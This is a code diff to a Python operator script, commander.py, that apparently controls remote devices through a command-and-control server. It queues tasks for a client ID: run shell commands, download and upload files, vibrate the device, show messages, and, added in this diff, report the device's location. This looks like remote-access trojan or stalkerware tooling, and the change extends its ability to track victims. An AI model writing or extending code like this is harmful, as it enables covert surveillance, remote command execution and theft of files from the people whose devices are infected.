@@ -22,31 +22,37 @@ def add_task(client_id, action, payload):
     print(f"[+] Task '{action}' added for {client_id}")
 
 def main():
-    if len(sys.argv) < 4:
+    if len(sys.argv) < 3: # Changed to 3 to allow 'location' which might not need a 4th arg
         print("Usage:")
         print("  python commander.py <ID> shell <command>")
         print("  python commander.py <ID> msg <message>")
         print("  python commander.py <ID> vibrate <duration_ms>")
         print("  python commander.py <ID> download <filename>")
         print("  python commander.py <ID> upload <remote_path>")
+        print("  python commander.py <ID> location")
         return
 
     client_id = sys.argv[1]
     command_type = sys.argv[2]
-    argument = sys.argv[3]
 
     if command_type == "shell":
+        argument = sys.argv[3]
         add_task(client_id, "shell", {"cmd": argument})
     elif command_type == "msg":
+        argument = sys.argv[3]
         add_task(client_id, "msg", {"content": argument})
     elif command_type == "vibrate":
+        argument = sys.argv[3]
         add_task(client_id, "vibrate", {"duration": int(argument)})
     elif command_type == "download":
-        # The Rust head expects {"filename": "..."}
+        argument = sys.argv[3]
         add_task(client_id, "download", {"filename": argument})
     elif command_type == "upload":
-        # The Rust head expects {"path": "..."}
+        argument = sys.argv[3]
         add_task(client_id, "upload", {"path": argument})
+    elif command_type == "location":
+        # Location doesn't necessarily need a 4th argument (argument)
+        add_task(client_id, "location", {})
     else:
         print(f"[!] Unknown command type: {command_type}")
 
